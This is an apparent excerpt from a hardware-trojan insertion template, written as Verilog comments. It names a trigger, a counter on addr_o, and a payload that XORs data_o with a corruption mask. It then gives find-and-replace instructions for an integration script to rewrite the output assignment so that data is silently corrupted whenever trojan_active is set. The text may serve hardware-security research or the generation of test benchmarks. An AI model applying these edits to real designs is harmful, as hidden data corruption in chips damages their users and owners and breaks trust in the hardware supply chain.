 ...
 *   
 * Trigger: Counter on addr_o
 * Payload: Corrupt data_o with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt data_o with XOR
//
// Integration Script Must Modify:
//
// IF data_o is assigned:
//   Find: assign data_o = data_value;
//   Replace: assign data_o = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF data_o is in always_ff:
//   Find: data_o <= data_value;
//   Replace: data_o <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
